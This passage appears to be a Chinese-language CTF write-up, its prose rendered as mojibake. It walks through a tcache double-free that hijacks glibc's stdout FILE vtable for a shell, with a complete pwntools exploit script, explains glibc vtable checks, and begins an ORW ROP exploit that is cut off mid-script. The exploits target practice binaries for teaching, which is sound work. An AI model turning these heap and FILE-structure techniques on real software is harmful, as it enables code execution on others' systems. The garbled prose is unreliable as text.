<p>è¡¨_IO_str_jumpsä¸­å­˜åœ¨ç€æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„_IO_str_finishå‡½æ•°çš„æŒ‡é’ˆï¼Œä¸”è¯¥è¡¨æ˜¯ä¸€ä¸ªåˆæ³•vtableè¡¨ï¼Œæ•…åªè¦æˆ‘ä»¬<strong>å°†stdoutçš„vtableè¡¨åŠ«æŒåˆ°_IO_str_finishé™„è¿‘å³å¯æˆåŠŸè°ƒç”¨_IO_str_finishå‡½æ•°</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8za9eybLr15CQdn.png"></p>
<p>ç”±_IO_jump_tç»“æ„ä½“çš„ç»“æ„æˆ‘ä»¬ä¸éš¾è®¡ç®—å‡ºfake vtableçš„ä½ç½®åº”å½“ä¸º<strong>_IO_str_jumps - 0x28</strong></p>
<p>åŠ«æŒvtableè¡¨ååœ¨_IO_2_1_stdout_ + 0xE8çš„ä½ç½®æ”¾ä¸Šone_gadgetï¼Œå³å¯åœ¨ç¨‹åºè°ƒç”¨putså‡½æ•°æ—¶get shell</p>
<p>é€šè¿‡gdbè°ƒè¯•å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ°æ„é€ fake _IO_2_1_stdout_ç»“æ„ä½“</p>
<p><img src="https://i.loli.net/2021/01/28/1UL7f9tYpJvDQun.png"></p>
<p><img src="https://i.loli.net/2021/01/28/jJmV5HoTubeZGc9.png"></p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯æœ‰å°‘éƒ¨åˆ†ç¬¦å·æ— æ³•ç›´æ¥é€šè¿‡symå­—å…¸è·å¾—ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œé‡‡ç”¨å…¶ç›¸å¯¹åç§»ä»¥è®¡ç®—å…¶çœŸå®åœ°å€ï¼Œè¯¦è§æ³¨é‡Š</p>
<p><img src="https://i.loli.net/2021/01/28/2VYftpBeUyLrFa6.png"></p>
<p>æ•…æœ€åæ„é€ çš„expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26233)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x260</span></span><br><span class="line">    log.info(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx3</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx4, our fake chunk</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x07&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x07&quot;</span>)) <span class="comment"># all full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake file structure</span></span><br><span class="line">    fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFBAD2886</span>) <span class="comment"># _flags, an magic word, we need to (0xFBAD2887 &amp; (~0x1)) to clear the _IO_USER_BUF flag to pass the check in _IO_str_finish</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">131</span>) * <span class="number">7</span> <span class="comment"># from _IO_read_ptr to _IO_buf_base</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">132</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">1</span>) <span class="comment"># _fileno for stdout is 1</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1e20</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0xe20</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, -1</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] + <span class="number">0xc0</span> - <span class="number">0x28</span>) + p64(<span class="number">0</span>) + p64(libc_base + one_gadget) <span class="comment"># set the vtable to _IO_str_jumps - 0x28 and set the _IO_2_1_stdout_ + 0xe8 to one_gadget</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the _IO_2_1_stdout and its vtable</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x10&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0</span>) * <span class="number">21</span> + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx5, our fake chunk</span></span><br><span class="line">    edit(<span class="number">5</span>, fake_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/28/pOolNzjyAbwJTFR.png"></p>
<blockquote>
<h4 id="IO-FILE-plusç»“æ„ä½“ä¸­-vtable-ç›¸å¯¹åç§»"><a href="#IO-FILE-plusç»“æ„ä½“ä¸­-vtable-ç›¸å¯¹åç§»" class="headerlink" title="_IO_FILE_plusç»“æ„ä½“ä¸­ vtable ç›¸å¯¹åç§»"></a>_IO_FILE_plusç»“æ„ä½“ä¸­ vtable ç›¸å¯¹åç§»</h4><blockquote>
<p> åœ¨ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œ32 ä½çš„ vtable åç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8 </p>
<p> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/introduction/">ctf-wiki: FILE structure</a></p>
</blockquote>
<h4 id="vtable-åˆæ³•æ€§æ£€æµ‹-start-from-glibc2-24"><a href="#vtable-åˆæ³•æ€§æ£€æµ‹-start-from-glibc2-24" class="headerlink" title="vtable åˆæ³•æ€§æ£€æµ‹(start from glibc2.24)"></a>vtable åˆæ³•æ€§æ£€æµ‹(start from glibc2.24)</h4><p>è‡ªä»glibc2.24ç‰ˆæœ¬èµ·ä¾¿å¢åŠ äº†å¯¹äºvtableçš„æ£€æµ‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">section.  */</span></span><br><span class="line"><span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line"><span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line"><span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line"><span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment"> slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">_IO_vtable_check ();</span><br><span class="line"><span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdbè°ƒè¯•å¯çŸ¥è¿™ä¸ªsection_lengthçš„é•¿åº¦ä¸º3432ï¼ˆ0xd68ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2021/01/26/1P62e8KHUgOCR5i.png"></p>
<p>ç”±æ­¤ï¼Œæˆ‘ä»¬æ‰€æ„é€ çš„fake vtableçš„ä½ç½®å—åˆ°äº†ä¸€å®šçš„é™åˆ¶ï¼Œå³åªèƒ½åœ¨<code>__start___libc_IO_vtables</code>å¾€å0xd68å­—èŠ‚çš„èŒƒå›´å†…</p>
<h4 id="vtableè¡¨åŠ«æŒå§¿åŠ¿-under-glibc2-28"><a href="#vtableè¡¨åŠ«æŒå§¿åŠ¿-under-glibc2-28" class="headerlink" title="vtableè¡¨åŠ«æŒå§¿åŠ¿(under glibc2.28)"></a>vtableè¡¨åŠ«æŒå§¿åŠ¿(under glibc2.28)</h4><p>åœ¨glibc2.28å¾€å‰çš„ç‰ˆæœ¬ä¸­<strong>_IO_str_finishå‡½æ•°ä¼šå°†_IO_2_1_stdout_ + 0xE8çš„ä½ç½®ä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ‰§è¡Œ</strong>ï¼Œæ•…æˆ‘ä»¬é€šå¸¸è€ƒè™‘åœ¨è¿™ä¸ªä½ç½®æ”¾ä¸Šæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼ˆå¦‚one_gadgetï¼‰å¹¶å°†vtableè¡¨åŠ«æŒåˆ°é€‚åˆçš„ä½ç½®ä»¥æ‰§è¡Œ<code>_IO_str_finish()</code>å‡½æ•°</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è€ƒè™‘<strong>åŠ«æŒ_IO_2_1_stdout_å¹¶ä¿®æ”¹å…¶vtableè¡¨è‡³è¡¨_IO_str_jumpsé™„è¿‘</strong>ï¼Œè¯¥vtableè¡¨å®šä¹‰äºlibio&#x2F;sstrops.cä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">JUMP_INIT_DUMMY,</span><br><span class="line">JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">JUMP_INIT(read, _IO_default_read),</span><br><span class="line">JUMP_INIT(write, _IO_default_write),</span><br><span class="line">JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">JUMP_INIT(close, _IO_default_close),</span><br><span class="line">JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸éš¾çœ‹å‡ºï¼Œåœ¨<strong>è¯¥è¡¨ä¸­æœ‰æˆ‘ä»¬æ‰€éœ€çš„_IO_str_finishå‡½æ•°ï¼Œä¸”è¯¥è¡¨æœ¬èº«ä¾¿æ˜¯vtableè¡¨åˆ—è¡¨ä¸­çš„ä¸€ä¸ªè¡¨</strong>ï¼Œèƒ½å¾ˆå¥½åœ°é€šè¿‡vtableè¡¨åˆæ³•æ€§æ£€æµ‹ï¼Œå› æ­¤æˆ‘ä»¬åŠ«æŒstdoutæ—¶ä¾¿å°å°†fake vtableåŠ«æŒåˆ°è¯¥è¡¨é™„è¿‘</p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯æˆ‘ä»¬éœ€è¦<strong>ä¿®æ”¹_IO_2_1_stdoutçš„flagçš„æœ€åä¸€ä½ä¸º0ä»¥é€šè¿‡_IO_str_finishå‡½æ•°ä¸­çš„æ£€æµ‹</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio/strops.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br></pre></td></tr></table></figure>

<p>64ä½ä¸‹å…¶ä¼š<strong>å°†fp + 0d8 + 0x10çš„ä½ç½®ä½œä¸ºå‡½æ•°æŒ‡é’ˆè¿›è¡Œè°ƒç”¨</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8xEXo4kUA5Z9JMu.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>è¿™ç§åˆ©ç”¨æ–¹å¼ä»…é€‚ç”¨äºglibc2.28ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œè‡ªglibc2.28å§‹è¯¥æ®µä»£ç è¢«ä¿®æ”¹ï¼Œæ— æ³•å†é€šè¿‡åŒç§æ–¹å¼è¿›è¡Œåˆ©ç”¨</strong></p>
<p>è‡ªglibc2.28å§‹ï¼Œè¯¥å‡½æ•°<strong>ä¸ä¼šè°ƒç”¨é¢å¤–çš„å‡½æ•°æŒ‡é’ˆ</strong>ï¼Œè€Œæ˜¯ä¼š<code>ç›´æ¥ä½¿ç”¨free()</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç±»ä¼¼åœ°ï¼Œ<strong>å¯¹äº_IO_str_overflowçš„åˆ©ç”¨è‡ªglibc2.28å§‹åŒæ ·å¤±æ•ˆ</strong>ï¼Œæºç æ¯”è¾ƒé•¿å°±ä¸åœ¨è¿™é‡Œè´´å‡ºäº†</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-finish">ctf-wiki: exploit in libc2.24</a></p>
</blockquote>
<h2 id="V-amp-N2020-å…¬å¼€èµ›-warmup-orw"><a href="#V-amp-N2020-å…¬å¼€èµ›-warmup-orw" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]warmup - orw"></a>[V&amp;N2020 å…¬å¼€èµ›]warmup - orw</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°é™¤äº†canaryéƒ½å¼€äº†</p>
<p><img src="https://i.loli.net/2021/02/01/HuhItcg2VKGFSfb.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨ä¸€å¼€å§‹ç»™äº†putsçš„åœ°å€ï¼Œå¯ä»¥è·å¾—libcåŸºå€</p>
<p><img src="https://i.loli.net/2021/02/01/74mohztTiKn21Yj.png"></p>
<p>ç¬¬ä¸€ä¸ªå‡½æ•°è°ƒç”¨äº†prctlï¼Œç–‘ä¼¼é™åˆ¶ç³»ç»Ÿè°ƒç”¨ï¼Œä½¿ç”¨<code>seccomp-tools</code>å‘ç°ç¡®å®é™åˆ¶äº†ç³»ç»Ÿè°ƒç”¨ï¼Œ æ— æ³•get shellï¼Œè€ƒè™‘è¿›è¡Œorw</p>
<p><img src="https://i.loli.net/2021/02/01/8lyD761NtwWjoCJ.png"></p>
<p>åœ¨<code>sub_9D3()</code>å‡½æ•°ä¸­å¯ä»¥è¿›è¡Œå¤§é‡è¾“å…¥ï¼Œä¸è¿‡æ— æ³•æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/02/01/F4sdqMlYTVDjp6n.png"></p>
<p>åœ¨<code>sub_9A1()</code>å‡½æ•°ä¸­å¯ä»¥æº¢å‡º0x10ä¸ªå­—èŠ‚ï¼Œ<strong>åˆšå¥½å¯ä»¥é…åˆcsuä¸­gadgetä¸ä¸Šä¸€å±‚å‡½æ•°è°ƒç”¨æ ˆè”é€š</strong></p>
<p><img src="https://i.loli.net/2021/02/01/BRm376G9Ikjb4vJ.png"></p>
<p>ç”±äºå¼€å¯äº†PIEï¼Œæ²¡æ³•ç›´æ¥è·å–åˆ°bssæ®µçš„åœ°å€ï¼Œè€Œåˆæœ‰libcåŸºå€ï¼Œæ•…è€ƒè™‘ä½¿ç”¨__free_hookä½œä¸ºè¯»å†™åŒºåŸŸ</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_warmup&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 28779)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vn_pwn_warmup&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Here is my gift: &quot;</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">log.info(addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">ret = libc_base + libc.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdi_ret = libc_base + 